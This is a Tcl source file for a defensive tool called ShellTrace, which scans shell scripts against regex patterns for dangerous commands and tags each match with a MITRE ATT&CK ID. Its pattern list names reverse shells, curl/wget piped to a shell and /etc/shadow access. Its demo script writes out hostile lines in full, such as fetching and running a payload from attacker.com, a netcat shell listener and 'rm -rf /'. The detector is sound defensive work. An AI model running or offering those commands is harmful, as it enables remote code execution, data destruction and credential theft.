#!/usr/bin/env tclsh
#
# NullSec ShellTrace - Shell Command Auditor
# Tcl security tool demonstrating:
#   - String manipulation
#   - Regular expressions
#   - List processing
#   - Dictionary data structures
#   - Procedure definitions
#   - File I/O
#
# Author: bad-antics
# License: MIT

package require Tcl 8.6

set VERSION "1.0.0"

# ANSI Colors
set RED "\033\[31m"
set GREEN "\033\[32m"
set YELLOW "\033\[33m"
set CYAN "\033\[36m"
set GRAY "\033\[90m"
set RESET "\033\[0m"

# Risk levels
set RISK_CRITICAL 4
set RISK_HIGH 3
set RISK_MEDIUM 2
set RISK_LOW 1
set RISK_INFO 0

# Dangerous command patterns with metadata
set dangerous_patterns {
    {rm\s+-rf\s+/} {command "rm -rf /" risk critical mitre "T1485" desc "Recursive root deletion"}
    {rm\s+-rf\s+\*} {command "rm -rf *" risk high mitre "T1485" desc "Recursive wildcard deletion"}
    {mkfs\s+} {command "mkfs" risk critical mitre "T1561" desc "Filesystem format command"}
    {dd\s+if=.*of=/dev/} {command "dd to device" risk critical mitre "T1561" desc "Direct device write"}
    {:>\s*/etc/passwd} {command "> /etc/passwd" risk critical mitre "T1003" desc "Password file truncation"}
    {chmod\s+777\s+} {command "chmod 777" risk high mitre "T1222" desc "World-writable permissions"}
    {chmod\s+-R\s+777} {command "chmod -R 777" risk critical mitre "T1222" desc "Recursive world-writable"}
    {wget\s+.*\|\s*(sh|bash)} {command "wget pipe to shell" risk critical mitre "T1059" desc "Remote code execution"}
    {curl\s+.*\|\s*(sh|bash)} {command "curl pipe to shell" risk critical mitre "T1059" desc "Remote code execution"}
    {eval\s+\$} {command "eval variable" risk high mitre "T1059" desc "Dynamic code execution"}
    {nc\s+-l.*-e} {command "netcat listener exec" risk critical mitre "T1059" desc "Reverse shell capability"}
    {bash\s+-i\s+>&\s+/dev/tcp} {command "bash reverse shell" risk critical mitre "T1059" desc "Network reverse shell"}
    {python.*-c.*socket} {command "python socket" risk high mitre "T1059" desc "Python network connection"}
    {base64\s+-d.*\|\s*(sh|bash)} {command "base64 decode to shell" risk critical mitre "T1027" desc "Encoded payload execution"}
    {echo\s+.*\|\s*base64\s+-d} {command "echo to base64 decode" risk medium mitre "T1027" desc "Possible encoded payload"}
    {export\s+PATH=} {command "PATH modification" risk medium mitre "T1574" desc "Environment hijacking"}
    {alias\s+(ls|cd|rm|cat)=} {command "command aliasing" risk high mitre "T1574" desc "Command hijacking"}
    {crontab\s+-e} {command "crontab edit" risk medium mitre "T1053" desc "Scheduled task modification"}
    {\*/\*\s+\*\s+\*\s+\*\s+\*} {command "cron every minute" risk high mitre "T1053" desc "Frequent scheduled execution"}
    {ssh\s+.*-o\s+StrictHostKeyChecking=no} {command "ssh no host check" risk medium mitre "T1021" desc "SSH security bypass"}
    {sshpass\s+} {command "sshpass" risk high mitre "T1110" desc "Plaintext SSH password"}
    {expect\s+-c.*spawn.*ssh} {command "expect ssh" risk medium mitre "T1021" desc "Automated SSH"}
    {iptables\s+-F} {command "iptables flush" risk high mitre "T1562" desc "Firewall rule clearing"}
    {ufw\s+disable} {command "ufw disable" risk high mitre "T1562" desc "Firewall disabling"}
    {setenforce\s+0} {command "setenforce 0" risk critical mitre "T1562" desc "SELinux disabling"}
    {\/etc\/shadow} {command "/etc/shadow access" risk high mitre "T1003" desc "Shadow file access"}
    {history\s+-c} {command "history clear" risk medium mitre "T1070" desc "Command history clearing"}
    {unset\s+HISTFILE} {command "unset HISTFILE" risk high mitre "T1070" desc "History logging bypass"}
    {shred\s+.*\.bash_history} {command "shred history" risk high mitre "T1070" desc "History file destruction"}
}

# Finding structure
proc create_finding {line_num line pattern_data} {
    return [dict create \
        line_number $line_num \
        command $line \
        pattern_name [dict get $pattern_data command] \
        risk [dict get $pattern_data risk] \
        mitre [dict get $pattern_data mitre] \
        description [dict get $pattern_data desc]]
}

# Get risk color
proc risk_color {risk} {
    global RED YELLOW CYAN GRAY
    switch $risk {
        critical { return $RED }
        high { return $RED }
        medium { return $YELLOW }
        low { return $CYAN }
        default { return $GRAY }
    }
}

# Get risk score
proc risk_score {risk} {
    global RISK_CRITICAL RISK_HIGH RISK_MEDIUM RISK_LOW RISK_INFO
    switch $risk {
        critical { return $RISK_CRITICAL }
        high { return $RISK_HIGH }
        medium { return $RISK_MEDIUM }
        low { return $RISK_LOW }
        default { return $RISK_INFO }
    }
}

# Analyze single line
proc analyze_line {line line_num} {
    global dangerous_patterns
    
    set findings {}
    
    foreach {pattern metadata} $dangerous_patterns {
        if {[regexp -nocase $pattern $line]} {
            lappend findings [create_finding $line_num $line $metadata]
        }
    }
    
    return $findings
}

# Analyze script file
proc analyze_script {filepath} {
    if {![file exists $filepath]} {
        puts "Error: File not found: $filepath"
        return {}
    }
    
    set findings {}
    set line_num 0
    
    set fp [open $filepath r]
    while {[gets $fp line] >= 0} {
        incr line_num
        
        # Skip comments and empty lines
        set trimmed [string trim $line]
        if {$trimmed eq "" || [string index $trimmed 0] eq "#"} {
            continue
        }
        
        set line_findings [analyze_line $line $line_num]
        foreach f $line_findings {
            lappend findings $f
        }
    }
    close $fp
    
    # Sort by risk
    return [lsort -command compare_findings $findings]
}

# Compare findings by risk
proc compare_findings {a b} {
    set score_a [risk_score [dict get $a risk]]
    set score_b [risk_score [dict get $b risk]]
    return [expr {$score_b - $score_a}]
}

# Demo script content
set demo_script {
    "#!/bin/bash"
    ""
    "# Suspicious script for testing"
    ""
    "wget http://malware.com/payload.sh | bash"
    ""
    "rm -rf /"
    ""
    "chmod -R 777 /var/www"
    ""
    "export PATH=/tmp/evil:$PATH"
    ""
    "unset HISTFILE"
    ""
    "nc -l -p 4444 -e /bin/bash"
    ""
    "curl http://attacker.com/script.sh | sh"
    ""
    "echo 'encoded payload' | base64 -d | bash"
    ""
    "crontab -e"
    ""
    "history -c"
    ""
    "cat /etc/shadow"
    ""
    "ssh user@host -o StrictHostKeyChecking=no"
    ""
    "iptables -F"
}

# Print banner
proc print_banner {} {
    puts ""
    puts "╔══════════════════════════════════════════════════════════════════╗"
    puts "║            NullSec ShellTrace - Shell Command Auditor            ║"
    puts "╚══════════════════════════════════════════════════════════════════╝"
    puts ""
}

# Print usage
proc print_usage {} {
    puts "USAGE:"
    puts "    shelltrace \[OPTIONS\] <SCRIPT>"
    puts ""
    puts "OPTIONS:"
    puts "    -h, --help       Show this help"
    puts "    -o, --output     Output format (text/json)"
    puts "    -s, --severity   Minimum severity to report"
    puts ""
    puts "FEATURES:"
    puts "    • 25+ dangerous patterns"
    puts "    • MITRE ATT&CK mapping"
    puts "    • Shell script analysis"
    puts "    • Risk scoring"
}

# Print finding
proc print_finding {finding} {
    global RESET
    
    set color [risk_color [dict get $finding risk]]
    set risk_str [string toupper [dict get $finding risk]]
    
    puts ""
    puts "  $color\[$risk_str\]$RESET [dict get $finding pattern_name]"
    puts "    Line:        [dict get $finding line_number]"
    puts "    Command:     [string trim [dict get $finding command]]"
    puts "    MITRE:       [dict get $finding mitre]"
    puts "    Description: [dict get $finding description]"
}

# Print summary
proc print_summary {findings} {
    global GRAY RESET RED YELLOW CYAN
    
    set critical 0
    set high 0
    set medium 0
    set low 0
    
    foreach f $findings {
        switch [dict get $f risk] {
            critical { incr critical }
            high { incr high }
            medium { incr medium }
            low { incr low }
        }
    }
    
    puts ""
    puts "$GRAY═══════════════════════════════════════════$RESET"
    puts ""
    puts "  Summary:"
    puts "    Issues Found: [llength $findings]"
    puts "    Critical:     $RED$critical$RESET"
    puts "    High:         $RED$high$RESET"
    puts "    Medium:       $YELLOW$medium$RESET"
    puts "    Low:          $CYAN$low$RESET"
}

# Demo mode
proc demo {} {
    global demo_script YELLOW CYAN RESET
    
    puts "$YELLOW\[Demo Mode\]$RESET"
    puts ""
    puts "${CYAN}Analyzing suspicious shell script...$RESET"
    
    set findings {}
    set line_num 0
    
    foreach line $demo_script {
        incr line_num
        
        set trimmed [string trim $line]
        if {$trimmed eq "" || [string index $trimmed 0] eq "#"} {
            continue
        }
        
        set line_findings [analyze_line $line $line_num]
        foreach f $line_findings {
            lappend findings $f
        }
    }
    
    # Sort by risk
    set sorted_findings [lsort -command compare_findings $findings]
    
    foreach f $sorted_findings {
        print_finding $f
    }
    
    print_summary $sorted_findings
}

# Main entry point
proc main {args} {
    print_banner
    
    if {[llength $args] == 0 || "-h" in $args || "--help" in $args} {
        print_usage
        puts ""
        demo
        return
    }
    
    set filepath [lindex $args end]
    
    if {$filepath eq "--demo"} {
        demo
        return
    }
    
    puts "Analyzing: $filepath"
    puts ""
    
    set findings [analyze_script $filepath]
    
    if {[llength $findings] == 0} {
        global GREEN RESET
        puts "${GREEN}✓ No suspicious commands found$RESET"
    } else {
        foreach f $findings {
            print_finding $f
        }
        print_summary $findings
    }
}

# Run
main {*}$argv
